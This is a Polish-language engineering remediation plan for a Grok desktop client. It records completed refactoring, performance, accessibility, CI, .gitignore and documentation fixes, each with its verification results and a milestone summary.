- **Rekomendacja:** react-query lub wspólny `useModels(conn)`/`useSettings(conn)`.
- **✅ Zrobione (2026-06-04):** Nowy `lib/serverState.ts` — lekki cache stanu serwera **bez nowej
  zależności** (react-query/zustand świadomie nieużywane). Generyczny `createResource(fetcher)`
  trzyma wynik **raz per połączenie** (klucz `baseUrl|token`): dedup zapytań w locie (współdzielony
  `promise`), współdzielony wynik między modułami (subskrypcja przez `useState`/`useEffect`, lazy-init
  z cache → brak migotania), `write()` do **write-through** i `peek()`. Eksport: `useModels(conn)`,
  `useSettings(conn)`, `saveSettings(conn, patch)` (PUT + merge do cache, by kolejny montaż widział
  świeże dane bez GET-a; API key nigdy nie wraca → odzwierciedlamy tylko `has_api_key`; błąd
  propagowany jak `putSettings` — por. P1-6). **Błąd NIE jest cache'owany na stałe** — kolejny montaż
  ponawia próbę (zachowana semantyka per-komponent), ale **sukces jest deduplikowany**. Wszystkie 6
  modułów przepięte: `getModels`/`getSettings` → `useModels`/`useSettings` (z efektem-derywatorem;
  ustawienia w ChatView/Settings aplikowane **raz** przez `useRef`, by odświeżenie cache nie nadpisało
  niezapisanych edycji); 5 wywołań `putSettings` (ChatView ×2, CodeView, Settings ×2) → `saveSettings`.
  **Weryfikacja:** `npm run typecheck` czysty; podgląd web (spy na `fetch`): przejście przez wszystkie
  6 modułów = **1×** GET `/models` i **1×** GET `/settings` (było 6× i 2×); zmiana modelu w Chacie
  (write-through) widoczna w Settings bez ponownego GET-a; select wypełniony z cache (`grok-4`/`grok-3`),
  zero błędów/ostrzeżeń w konsoli.

### [x] P2-3 — Gigantyczne komponenty / prop drilling  🟡 ŚREDNIE
- **Pliki:** `CodeView.tsx` (~499 l.), `ChatView.tsx` (~598 l.)
- **Rekomendacja:** ekstrakcja hooków (`useConversations`, `useChatStream`, `useWorkspace`,
  `useDictation`, `useAttachments`), wspólny `<ModelSelect>`.
- **✅ Zrobione (2026-06-04):** Wydzielono logikę do hooków w `lib/` + wspólny komponent:
  `useConversations` (lista rozmów, init/persist z localStorage z debounce P1-7, CRUD, `saveError`),
  `useChatStream` (stan `streaming` + uchwyt; **dodatkowo przerywa strumień przy odmontowaniu** —
  przełączenie modułu nie zostawia osieroconego streamu, czego stary ChatView nie robił),
  `useDictation` (STT mic toggle, oddaje tekst przez callback, cleanup nagrywania), `useAttachments`
  (identyczny `addFiles`/`removeAttachment` wcześniej duplikowany w ChatView i AgentPanel),
  `useWorkspace` (warstwa danych modułu Code: workspace + zakładki edytora + Git + przeładowania po
  turze agenta — spina sprzężone operacje wcześniej rozsiane po CodeView), oraz `ui/ModelSelect`
  (wspólny select modelu z fallbackiem na bieżącą wartość — używany w ChatView **i** AgentPanel).
  **Efekt:** `ChatView` 611→468 l., `CodeView` 501→363 l., `AgentPanel` 393→353 l.; logika w
  cohezyjnych, reużywalnych jednostkach (JSX to teraz większość). **Weryfikacja:** `npm run typecheck`
  czysty; podgląd web — pełny przebieg wysyłki w ChatView (user msg, tytuł rozmowy z `titleFromText`,
  `onError` strumienia → „⚠️ …" + baner błędu, reset `streaming`, wyczyszczony input, utrwalenie
  rozmowy w localStorage i przetrwanie remountu), CodeView renderuje się przez `useWorkspace`,
  AgentPanel z `ModelSelect` (fallback `grok-build-0.1`); zero błędów/ostrzeżeń w konsoli.

### [x] P2-4 — Wydajność renderu  🟡 ŚREDNIE
- **Pliki:** `components/code/FileTree.tsx` (brak wirtualizacji/`React.memo`), `ChatView.tsx:480-536`
  (re-render wszystkich `Markdown` przy każdej delcie, klucze po indeksie), `App.tsx:16-23` (brak
  code-splittingu — CodeMirror/xterm/highlight.js na starcie)
- **Rekomendacja:** `React.memo(TreeNode)` + wirtualizacja (`react-window`); memoizacja wierszy czatu +
  stabilne klucze (id w `ChatMessage`); `React.lazy` ciężkich modułów.
- **✅ Zrobione (2026-06-04):** (1) **Code-splitting** — `App.tsx` ładuje wszystkie 7 widoków modułów
  przez `React.lazy` + `Suspense` (loader `ModuleFallback`), odraczając CodeMirror/xterm (Code) i
  react-markdown/highlight.js (Chat/Agent) z bundla startowego; chunk doczytuje się przy pierwszym
  wejściu (lokalnie → szybko). (2) **Memoizacja czatu** — wydzielony `ChatMessageRow` (`memo`) +
  `Markdown` owinięty w `memo`; callbacki ustabilizowane (`copyMessage` przez `useCallback`, TTS
  przeniesione do nowego `useTts` ze **stabilnym `speak`**; `isSpeaking` jako bool zamiast całego
  `ttsIdx`). Efekt: podczas streamingu/typowania odświeża się tylko zmieniana wiadomość, nie wszystkie
  `Markdown`. (3) **FileTree** — `TreeNode` owinięty w `memo`, a `useWorkspace.openFile` ustabilizowany
  `useCallback`-iem (stabilny `onOpen` + stały `conn` w czasie życia CodeView) → przerendery CodeView
  niezwiązane z drzewem (odświeżenie Git po turze agenta/zapisie, toggle terminala, zmiana modelu) nie
  kaskadują przez rozwinięte poddrzewo. **Klucze po indeksie świadomie zachowane** (lista czatu rośnie
  tylko na końcu, edytowana jest wyłącznie ostatnia wiadomość — brak wstawień w środku, więc index jest
  stabilny; id w `ChatMessage` wymagałoby migracji storage bez realnego zysku). **Pełna wirtualizacja
  drzewa (`react-window`) świadomie odłożona** — `FileTree` to rekurencyjne drzewo ładowane na żądanie
  (nie płaska lista); wirtualizacja wymagałaby nowej zależności (instalacja z sieci) + spłaszczenia
  widocznych węzłów; `memo` rozwiązuje praktyczny problem kaskady przerenderów. **Weryfikacja:**
  `npm run typecheck` czysty; podgląd web — wszystkie 7 leniwych modułów wstają bez błędów konsoli;
  licznik renderów `Markdown` (tymczasowy): po typowaniu w polu (przerender ChatView) ukończone
  wiadomości **0** dodatkowych renderów (memo działa); CodeView (lazy) + FileTree renderują się
  poprawnie. Licznik testowy cofnięty.

### [x] P2-5 — Voice/realtime: deprecated API i nieczyszczona sesja  🟡 ŚREDNIE
- **Plik:** `desktop/src/renderer/src/lib/realtime.ts:119` (`ScriptProcessorNode`), `components/Voice.tsx`
- **Rekomendacja:** migracja na `AudioWorkletNode`; stop sesji Live przy zmianie `mode` (nie tylko unmount).
- **✅ Zrobione (2026-06-04):** (1) **Migracja na AudioWorkletNode** — `realtime.ts` zastępuje
  deprecated `ScriptProcessorNode` procesorem AudioWorklet działającym w osobnym wątku audio. Kod
  procesora (`PCM_WORKLET_CODE`) ładowany jako **Blob URL** (`audioWorklet.addModule`), więc działa
  tak samo w dev/podglądzie/spakowanym buildzie `file://` bez osobnego pliku-assetu ani CSP-owych
  niespodzianek (brak CSP w repo — zweryfikowane). Procesor buforuje wejście do ~2048 próbek,
  konwertuje **Float32→PCM16 w wątku audio** (odciąża main) i przekazuje `ArrayBuffer` jako
  **transferowalny** (bez kopii) do `port.onmessage`, który strumieniuje go po WS. Ścieżka grafu:
  `source → AudioWorkletNode → gain(0) → destination` (worklet przetwarza tylko będąc w drodze do
  destination; zerowy gain tłumi odsłuch — jak wcześniej). `stopMic` zamyka port i rozłącza
  worklet/sink/source; dodano guard na wyścig `stop()` podczas `await addModule`. Usunięto martwy
  `floatToPcm16` (logika w workleciej). (2) **Stop sesji Live przy zmianie trybu** — nowy efekt w
  `Voice.tsx` (`[mode]`): opuszczenie trybu Live (nie tylko odmontowanie) woła `session.stop()`,
  zeruje ref i ustawia status `Idle` → mikrofon i WS nie zostają aktywne po przełączeniu na
  Speak/Transcribe. **Weryfikacja:** `npm run typecheck` czysty; podgląd web — **procesor AudioWorklet
  przetestowany na żywo** (oscylator → worklet): 79 ramek, dokładnie 161792 = 79×2048 próbek
  (potwierdza buforowanie), `maxAbs=32768` (poprawna konwersja PCM16 pełnej skali), zero błędów;
  moduł Voice renderuje się we wszystkich trybach, przełączanie Speak/Transcribe/Live działa bez
  błędów konsoli. **Pełna sesja Live** (mikrofon → WS realtime → odtwarzanie) — weryfikacja po stronie
  użytkownika (wymaga zgody na mikrofon i backendu realtime; sandbox blokuje TLS do api.x.ai).

### [x] P2-6 — Dostępność  🟡 ŚREDNIE
- **Problem:** klikalne `<div>` zamiast `<button>` (lista rozmów, drzewo, zakładki); Popover bez
  `aria`/focus-trap; ikony tylko z `title=`.
- **Rekomendacja:** realne `<button>`/`role`+`tabIndex`+`onKeyDown`; `aria-*` w Popover; `aria-label`.
- **✅ Zrobione (2026-06-04):** (1) **Klikalne `<div>` → realne `<button>`y** (fokus klawiaturą +
  Enter/Space): lista rozmów (ChatView — wybór + `aria-current`, osobny przycisk usuwania z
  `aria-label`), zakładki edytora (CodeView), węzły drzewa plików (FileTree — `aria-expanded` dla
  katalogów). (2) **Popover dostępny** (`ui/Popover.tsx`): panel `role="dialog"` + `aria-label`
  (prop `label`); przy otwarciu fokus wchodzi do panelu, **Tab jest uwięziony** (focus-trap,
  Tab/Shift+Tab zawija), a po zamknięciu **wraca na wyzwalacz** (przez pierwszy fokusowalny w
  korzeniu — odporne na przemontowanie wyzwalacza, np. IconButton zmieniający opakowanie Tooltip na
  `open`; przywraca tylko gdy fokus i tak by zniknął). Wyzwalacz dostaje `triggerProps`
  (`aria-haspopup="dialog"` + `aria-expanded`) — wpięte w ChatView/CodeView/ThemeToggle. (3)
  **`aria-label` na ikonowych przyciskach** (raw `<button title>`): Send/Stop/Dictate, Copy/Read
  aloud w wierszach czatu, zamknięcie zakładki, usuwanie załącznika; **AttachButton** — input
  zmieniony z `hidden` na `sr-only` (fokusowalny z klawiatury) + `aria-label` + pierścień
  `focus-within`. (4) **`aria-pressed`** na segmentach trybu Voice i pozycjach motywu. Dodano też
  widoczny `focus-visible:ring` na nowych kontrolkach. **Weryfikacja:** `npm run typecheck` czysty;
  podgląd web (drzewo dostępności + symulacja): wiersze rozmów to `button`+`aria-current`, ikonowe
  przyciski mają `aria-label`, input pliku ma `aria-label`; Popover — `aria-expanded` przełącza,
  panel `role=dialog`+`aria-label`, fokus wchodzi do panelu, Esc zamyka i **przywraca fokus na
  wyzwalacz**, focus-trap zawija Tab/Shift+Tab; pozycje motywu mają `aria-pressed` (System=true);
  zero błędów konsoli na świeżym ładowaniu.

### [x] P2-7 — Typowanie ramek WS  🟢 NISKIE
- **Plik:** `lib/agentClient.ts:6-10` (`AgentEvent` jako `{type; [k]:unknown}`)
- **Rekomendacja:** discriminated union per `type`; walidacja ramek wejściowych (np. zod) na granicy.
- **✅ Zrobione (2026-06-04):** `AgentEvent` w `lib/agentClient.ts` zmieniony z luźnego
  `{type:string; [k]:unknown}` na **discriminated union** po `type` (10 wariantów zgodnych z
  protokołem w `grok_core/routes/agent.py`: `workspace/text/tool_call/approval_request/output/
  tool_result/assistant_done/stopped/done/error` + typ `ApprovalDetail`). Dodano **walidator na
  granicy** `parseAgentEvent(raw)` (bez nowej zależności — zod świadomie pominięty): zawęża po `type`,
  **normalizuje typy pól** (helpery `asString`/`asRecord`/`parseDetail`, `ok === true`), a nieznany
  `type`/niepoprawny kształt → `null` (ramka pomijana). `ws.onmessage` przepuszcza surową ramkę przez
  parser. `AgentPanel.handleEvent` dostaje union → switch zawęża pola, więc usunięto zbędne
  `String(...)`/`as` (dodano też jawny `case 'workspace'`; switch jest wyczerpujący — tsc pilnuje).
  **Weryfikacja:** `npm run typecheck` czysty (wyczerpujący union wymusza poprawną obsługę);
  podgląd web z atrapą `WebSocket` wstrzykującą ramki do prawdziwego `AgentConnection`: poprawne
  ramki (text/tool_call/output/error) wyrenderowane, **nieznany `type` i nie-obiekt pominięte** (brak
  wycieku/awarii), zniekształcony `tool_result` (`ok:'yes'`, `summary:null`) **skoercowany** → status
  `error`, pusty summary; zero błędów konsoli.

---

## P3 — Testy, pakowanie, dokumentacja

### [x] P3-1 — Brak CI i realnych testów logiki  🟠 WYSOKIE
- **Problem:** 4 self-checki to smoke-testy transportu/auth. Nieprzetestowane: cała logika
  `api_manager` (w tym dekoding UTF-8/SSE — najbardziej podatny na regresję wg CLAUDE.md), OAuth,
  reguły własności JSON, wszystkie trasy Voice/Video/Image. Frontend ma tylko `tsc`. Brak `.github/`.
- **Rekomendacja:** GitHub Actions (4 skrypty + `npm run typecheck`); unit-test dekodowania UTF-8 ze
  stubem `requests.Response`; rozszerzyć `api_smoke.py` o trasy voice/media (shape+auth); test-strażnik,
  że zapis ustawień nie rusza `grok_config.json`. Naprawić `api_smoke._ws_check` (fałszywy „pass" przy
  braku `websockets`).
- **✅ Zrobione (2026-06-04):** (1) **GitHub Actions** — nowy [`.github/workflows/ci.yml`](../../../.github/workflows/ci.yml):
  job **backend** (`windows-latest`, Python 3.11 — środowisko docelowe: `cmd.exe`/`pywinpty`/tree-kill)
  uruchamia `handshake_check.py` + `api_smoke.py` + `agent_selfcheck.py`; job **frontend**
  (`ubuntu-latest`, Node 22) `npm ci` + `npm run typecheck`. `concurrency: cancel-in-progress`,
  `PYTHONUTF8/PYTHONIOENCODING=utf-8` (testy operują na polskich znakach), `ELECTRON_SKIP_BINARY_DOWNLOAD=1`
  (typecheck nie potrzebuje binarki Electrona). `sidecar_smoke.py` **świadomie poza CI** (wymaga
  spakowanego `.exe` z PyInstallera → biegnie po `pack:sidecar` na maszynie wydającej). (2) **Unit
  dekodowania UTF-8/SSE** — `_unit_sse_utf8` w `api_smoke.py`: atrapa `requests.post` zwraca strumień
  **surowych bajtów UTF-8** (`ensure_ascii=False`), test sprawdza brak mojibake, akumulację delt,
  `stream=True`+`timeout` oraz ścieżkę bajtową `iter_lines(decode_unicode=False)` — strażnik regresji
  „ISO-8859-1". (3) **Trasy media/voice (shape+auth)** — `_live_media_voice_routes` na żywym sidecarze:
  401 bez tokenu / 403 zły token (`/images/generate`, `/voice/tts`) oraz **422** (Pydantic, przed
  ciałem trasy → bez xAI) dla pustego promptu, `n` poza zakresem, non-data-URI obrazu, `duration`
  poza zakresem i pustego TTS. (4) **Strażnik własności JSON** — `_unit_settings_ownership`:
  przekierowuje pliki danych do tempdir (też nazwy zaimportowane do legacy modułów), sieje sentinel w
  `grok_config.json`, robi `Backend.update_settings(...)` i sprawdza, że `grok_config.json` jest
  **nietknięty** (domena `HistoryManagera`), a patch trafił do `grok_settings.json` (+ `has_api_key`);
  ścieżki przywracane w `finally`. (5) **Naprawiony `_ws_check`** — brak `websockets` to już **nie
  cichy „pass"**: osobna asercja „websockets installed" + jawny `[SKIP]` żywych testów WS (fail-closed
  — brak biblioteki w venv = czerwone CI); usunięto fałszywe `return (True, True)`. **Świadomie
  odłożone:** żywe testy OAuth i pełnej logiki `api_manager`/tras media (poza SSE/walidacją) — wymagają
  sieci i poświadczeń (sandbox blokuje TLS do `api.x.ai`/`auth.x.ai`), więc weryfikuje je użytkownik.
  **Weryfikacja:** `api_smoke.py` **55/55** OK (było 38; +17 nowych), `handshake_check.py` OK,
  `agent_selfcheck.py` **74/74** OK, `npm run typecheck` czysty.

### [x] P3-2 — Ikona instalatora nie trafi do repo  🟠 WYSOKIE
- **Plik:** `.gitignore:8` (`build/` bez `/`) ignoruje `desktop/build/icon.ico` (i `appicon.ico`)
- **Rekomendacja:** zakotwiczyć `/build/`, `/dist/`, `/Output/`; wymusić `!desktop/build/icon.ico`.
- **✅ Zrobione (2026-06-04):** Zakotwiczono w `.gitignore` `build/`→`/build/`, `dist/`→`/dist/`,
  `Output/`→`/Output/` (do KORZENIA repo) — wcześniej nieanchored `build/` łapał też `desktop/build/`
  i ignorował **ikonę instalatora** (`desktop/build/icon.ico`, czyli electron-builder `buildResources`
  z [`desktop/electron-builder.yml`](../../../desktop/electron-builder.yml)), więc świeży klon budował NSIS
  bez ikony. Dodano jawny `!desktop/build/icon.ico` (źródło buildu — wymuszone do repo; redundantne po
  zakotwiczeniu, ale chroni przed ponownym dodaniem szerokiego `build/`). `appicon.ico` **świadomie
  zostaje ignorowany** — jest generowany przez [`make_icon.py`](../../../make_icon.py) (artefakt, „uruchom raz
  przed budową"), a nie źródło. Korzeniowe `/build/` i `/dist/` (working/output PyInstallera) oraz
  `desktop/out`/`desktop/dist` (electron-vite/-builder) nadal ignorowane. **Weryfikacja
  (`git check-ignore`):** przed — `desktop/build/icon.ico` IGNORED; po — `not ignored` + `git add
  --dry-run` go dodaje; korzeniowe `build`/`dist`/`Output/*`, `desktop/out`, `desktop/dist/*`,
  `appicon.ico` dalej ignorowane. (`desktop/.gitignore` zweryfikowany — brak kolidującego `build/`.)

### [x] P3-3 — `.gitignore` po nazwach plików, nie wzorcach  🟠 WYSOKIE (latentne)
- **Problem:** przyszły `grok_auth.json.bak`/`grok_cache.json` nie byłby ignorowany → wyciek sekretu.
- **Rekomendacja:** dodać siatkę `grok_*.json`, `*.env`, `.env.*`, `*.token` (obok jawnych linii).
- **✅ Zrobione (2026-06-04):** Dodano siatkę wzorców w `.gitignore` OBOK jawnych nazw (zachowane jako
  dokumentacja): `*.env`, `.env.*`, `*.token`, `grok_*.json` oraz **dodatkowo `grok_*.json.*`** —
  rekomendowany `grok_*.json` łapie `grok_cache.json`, ale NIE `grok_auth.json.bak` (inny suffix),
  a problem wprost wymienia kopię `.bak`; `grok_*.json.*` domyka kopie/temp (`.bak`/`.tmp` z
  `atomic_write_text`/`.old`). **Brak fałszywych trafień** — `grok_*.json*` nie dotyka źródeł
  (`grok_core/`, `grok_core.spec`, `grok_core_sidecar.py` nie zawierają `.json`); brak w repo
  szablonu `.env.example`, który `.env.*` mógłby błędnie ukryć (gdyby powstał — dodać `!.env.example`).
  **Weryfikacja (`git check-ignore -v`):** ignorowane teraz `grok_auth.json.bak` (→`grok_*.json.*`),
  `grok_cache.json` (→`grok_*.json`), `grok_settings.json.tmp`, `prod.env` (→`*.env`), `.env.local`
  (→`.env.*`), `app.token` (→`*.token`); a `grok_core.spec`, `grok_core_sidecar.py`, `grok_core/server.py`,
  `make_icon.py`, `config.py` oraz `desktop/build/icon.ico` (P3-2) **nadal śledzone**.

### [x] P3-4 — Dryf wersji (3 źródła)  🟡 ŚREDNIE
- **Pliki:** `config.py:6` (`1.1`) vs `grok_core/server.py:41` (`0.1.0`) vs `desktop/package.json:4`
  (`0.0.1` — instalator pokaże tę).
- **Rekomendacja:** jedno źródło prawdy; pozostałe wyprowadzać/zsynchronizować.
- **✅ Zrobione (2026-06-04):** Ustanowiono **JEDNO źródło prawdy wersji PRODUKTU =
  `desktop/package.json`** (to ją pokazuje instalator). Analiza użyć ujawniła, że to NIE są trzy
  zduplikowane kopie tej samej wartości: `config.APP_VERSION` (`1.1`) jest konsumowane **wyłącznie**
  przez legacy `archive/app.py` (tytuł okna) — to wersja OSOBNEGO, archiwalnego produktu, więc jej nie
  fałszujemy; dodano tylko komentarz w `config.py` jasno to rozgraniczający. Drift dotyczył realnie
  pary **sidecar vs instalator**: (1) `grok_core/server.py` przestał hardkodować `"0.1.0"` — nowy
  `_resolve_app_version()` ustala wersję z `env GROK_CORE_APP_VERSION` → odczyt `desktop/package.json`
  (dev/standalone z korzenia) → `"0.0.0"` (sygnał błędu); raportowana w handshake/`/health`/`/whoami`
  i jako `FastAPI(version=…)`. (2) `desktop/src/main/index.ts` **wstrzykuje** `GROK_CORE_APP_VERSION =
  app.getVersion()` do env sidecara przy `spawn` — dzięki temu **spakowany** build (gdzie sidecar nie
  widzi `package.json`) też raportuje wersję produktu. (3) **Strażnik w `api_smoke.py`**: handshake
  oraz `/health` muszą równać się `desktop/package.json.version` → przyszły dryf = czerwone CI.
  **Efekt:** cały nowy produkt raportuje teraz `0.0.1` (było: sidecar `0.1.0`); `config.APP_VERSION`
  `1.1` zostaje świadomie jako wersja legacy. **Weryfikacja:** `api_smoke.py` 57/57 (było 55; +2
  wersji), `handshake_check.py` OK (`version=0.0.1`), `agent_selfcheck.py` 74/74, `npm run typecheck`
  czysty.

### [x] P3-5 — Dryf dokumentacji  🟡 ŚREDNIE
- **Problem:** `REBUILD_PLAN.md` (deklarowane „jedyne źródło prawdy") nie wspomina Voice/Image-merge/
  Video-edit i mówi o Monaco; `README.md` ma stary zestaw modułów (brak Voice; są usunięte
  Generator/Edit) i niepełną listę endpointów.
- **Rekomendacja:** dopisać „Fazę 9" lub wskazać `MODYFIKACJE.md` jako żywą specyfikację; zsynchronizować
  README (moduły + endpointy `/voice/*`, `/video/edits|extensions`).
- **✅ Zrobione (2026-06-04):** Zsynchronizowano dokumentację z faktycznym stanem (ustalonym z kodu:
  `App.tsx` → 7 modułów, dekoratory tras + prefiksy routerów → pełna lista endpointów). **`README.md`:**
  diagram architektury i sekcja „Moduły" — `Generator/Edit` → **Image**, dodany **Voice**, doprecyzowane
  Video (edycja/przedłużanie) i Chat (załączniki + głos); linia tras o `/voice(+WS)` i `/permissions`;
  `routes/` w strukturze repo o `voice, permissions`; nagłówek statusu i sekcja „Dokumentacja" wskazują
  teraz **[`MODYFIKACJE.md`](MODYFIKACJE.md)** (żywa specyfikacja) i ten plik. **`REBUILD_PLAN.md`:** §1–12
  zachowane jako **zapis historyczny** (datowane statusy faz nietknięte), ale dodano (a) notę u góry
  rozgraniczającą „źródło prawdy faz 0–8" od stanu obecnego i wskazującą `MODYFIKACJE.md`/`PLAN_NAPRAWY.md`,
  (b) ostrzeżenie w §7, że szkic mówi o Monaco, choć edytor to **CodeMirror 6** (decyzja w §10f), (c) nową
  **§13 „Faza 9"** rekonsolidującą stan: 7 modułów, faktyczny stack frontu (CodeMirror/Tailwind v4/własny
  cache stanu — nie Monaco/shadcn/zustand/react-query), **pełną listę endpointów REST+WS**, źródło wersji
  (P3-4) i wskaźnik do hardeningu. **`grok_core/README.md`** (kanoniczna lista endpointów): dopisane
  `/permissions`, `/git/add|commit`, `/fs/recent` oraz nadbudowa media/głos (`/video/edits|extensions`,
  `/voice/tts|stt`, WS `/voice/realtime`, rozszerzone `/models`). **Weryfikacja:** brak pozostałych
  „Generator/Edit" jako bieżących modułów; jedyna wzmianka „Monaco" to świadoma nota „zamiast Monaco";
  cross-check 9 nowych endpointów obecnych w §13. (Czysto dokumentacja — bez zmian w kodzie/testach.)

### [x] P3-6 — Pakowanie i zależności  🟡 ŚREDNIE
- **Problem:** brak podpisu kodu i auto-update (świadomie odłożone); Windows-only; `requirements.txt`
  bez górnych granic i bez locka. `code.html` (stray) trafiłby do commita.
- **Rekomendacja:** `requirements.lock` (pip-compile) dla powtarzalności; używać `npm ci` (nie
  `npm install`); usunąć/zarchiwizować `code.html`; zaplanować podpis przed dystrybucją publiczną.
  OAuth redirect port 56121 sztywny (`config.py:58`) — dodać fallback na port efemeryczny.
- **✅ Zrobione (2026-06-04):** (1) **`grok_core/requirements.lock`** — pełny przypięty snapshot venv
  (`pip freeze`, 32 pakiety) dla powtarzalnych buildów; nagłówek opisuje instalację (`-r requirements.lock`),
  regenerację i że runtime-minimum to nadal `requirements.txt`; `requirements.txt` dostał wskaźnik do
  locka. (2) **`npm ci`** — CI (`.github/workflows/ci.yml` z P3-1) już go używa; docs (`README.md`,
  `desktop/README.md`) zmienione z `npm install` → **`npm ci`** (npm install tylko przy zmianie
  zależności). (3) **`code.html` USUNIĘTY** — stray makieta projektowa (CDN Tailwind, inny system
  kolorów `#3858fa`, `lang=pl`, niereferencjonowana przez build); była untracked (nie weszła do
  pierwszego commita). (4) **Fallback portu OAuth — JUŻ ZAIMPLEMENTOWANY** (`oauth_manager._start_server`):
  próbuje `OAUTH_REDIRECT_PORT` (56121), przy zajętości `0` (efemeryczny), a `redirect_uri` używa
  **faktycznie zbindowanego portu** (loopback per RFC 8252) — zweryfikowane w kodzie, bez zmian. (5)
  **Podpis kodu / auto-update** — świadomie odłożone do dystrybucji publicznej (udokumentowane w
  `REBUILD_PLAN.md` §9). Przy okazji domknięto dryf w `desktop/README.md` (lista komponentów
  `Generator/Edit`→Image/Voice, `styles.css`→`index.css`, dołożone Tailwind v4 / react-resizable-panels).
  **Weryfikacja:** `api_smoke.py` 57/57, `agent_selfcheck.py` 74/74 (bez regresji; brak zmian w kodzie
  Pythona — same docs/lock/usunięcie stray).

---

## Kolejność prac (kamienie milowe)

**M1 — Bezpieczeństwo agenta (P0):** P0-1 → P0-2 → P0-3 → P0-4 → P0-5 → P0-6/7/8.
Kryterium: nowe testy w `agent_selfcheck.py` na łańcuchowanie, ucieczkę `glob`, timeout `grep`,
syntetyczne wyniki przy Stop; `/security-review` na zmianach czysty.
**✅ UKOŃCZONY (2026-06-03).** Wszystkie P0-1…P0-8 wdrożone i przetestowane (`agent_selfcheck.py`
74/74, `api_smoke.py` 23/23). Przegląd bezpieczeństwa zmian P0 (ręczny — harness `/security-review`
nie ruszył bo repo bez commitów, otwarte P3-2/3): **brak ustaleń Critical/High** na platformie
docelowej (Windows/cmd). Domknięto dwa ustalenia: (M) `grep` sprawdza łączny budżet czasu co linię
(było co 500 → możliwy DoS wolnym wzorcem, bo grep jest READONLY/bez bramki); (L) udokumentowano,
że `command_metachars` jest poprawne dla cmd.exe, a na POSIX `\"` mógłby ukryć operator — przy
ewentualnym uruchomieniu na Linux/Mac użyć `shell=False`+argv.

**M2 — Stabilność (P1):** P1-5 (timeouty) → P1-4 (most streamingu) → P1-1/2/3 (Electron) →
P1-6 (reconnect WS) → P1-7 (logging/błędy) → P1-8 (trwałość) → P1-9/10.
Kryterium: ubicie sidecara w trakcie streamu odzyskiwane; brak cichych utrat danych; `api_smoke` zielony.
**✅ UKOŃCZONY (2026-06-04).** Wszystkie P1-1…P1-9 wdrożone i przetestowane. `api_smoke.py` rozrósł
się do 38 asercji (timeouty xAI, most czatu single-flight/delta, autoryzacja+CORS, walidacja wejścia),
`agent_selfcheck.py` 74/74, `npm run typecheck` czysty. Realne ścieżki sieciowe (xAI, restart sidecara
w działającej apce) — do potwierdzenia po stronie użytkownika (sandbox blokuje TLS do api.x.ai).

**M3 — Jakość/wydajność (P2):** P2-1 (error boundary) → P2-2 (cache) → P2-3 (hooki) →
P2-4 (wydajność) → P2-5/6/7.
**✅ UKOŃCZONY (2026-06-04).** Wszystkie P2-1…P2-7 wdrożone i przetestowane (`npm run typecheck`
czysty; każdy punkt zweryfikowany w podglądzie web — error boundary, dedup `/models` 6×→1×, ekstrakcja
hooków + `ModelSelect`, lazy/memo/`React.memo(TreeNode)`, AudioWorklet + stop Live na zmianie trybu,
dostępność `<button>`/Popover/`aria-*`, discriminated union ramek WS + walidacja na granicy). Realne
ścieżki sieciowe (xAI, pełna sesja agenta/Live) — do potwierdzenia po stronie użytkownika.

**M4 — Testy/pakowanie/dokumentacja (P3):** P3-3/2 (higiena `.gitignore`) → pierwszy commit →
P3-1 (CI) → P3-4/5/6.
**✅ UKOŃCZONY (2026-06-04).** Wszystkie P3-1…P3-6 wdrożone. `.gitignore` zahartowany (ikona
instalatora śledzona, siatka sekretów); **pierwszy commit** repo (`5dfe375`); GitHub Actions CI
(3 self-checki + typecheck) + nowe testy logiki (`api_smoke.py` 57/57: SSE UTF-8, trasy media/voice,
strażnik własności JSON i wersji); jedno źródło wersji (`desktop/package.json`); dokumentacja
zsynchronizowana (README + `REBUILD_PLAN §13` + `grok_core/README`); `requirements.lock`, `npm ci`,
`code.html` usunięty. Świadomie odłożone (poza zakresem prototypu): podpis kodu + auto-update.

---

## Kryteria akceptacji / weryfikacja

- Backend: `grok_core\.venv\Scripts\python grok_core\tools\agent_selfcheck.py` oraz `...\api_smoke.py`
  zielone (rozszerzone o nowe przypadki bezpieczeństwa i trasy voice/media).
- Frontend: `cd desktop; npm run typecheck` (exit 0).
- Bezpieczeństwo: `/security-review` na gałęzi ze zmianami P0 bez ustaleń Critical/High.
- Realne wywołania xAI (czat, media, głos, przebieg agenta) — weryfikacja po stronie użytkownika
  z ważnymi poświadczeniami (sandbox blokuje TLS do `api.x.ai`).

---

*Dokument do aktualizacji w miarę realizacji. Po wdrożeniu danego punktu oznaczać `[x]` i datować.*
